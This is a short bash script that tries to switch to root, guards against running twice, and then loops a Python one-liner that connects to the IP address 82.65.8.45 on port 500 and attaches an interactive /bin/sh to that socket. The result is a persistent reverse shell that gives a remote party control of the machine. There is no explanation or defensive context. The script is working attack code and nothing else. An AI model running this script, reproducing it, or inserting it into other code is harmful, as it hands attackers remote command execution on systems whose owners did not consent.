#!/bin/bash

su root
if ps aux | grep -v grep | grep "bash ./testpyt.sh" > /dev/null;
then
	exit 0
fi
while [ true ]
do
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("82.65.8.45",500));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
done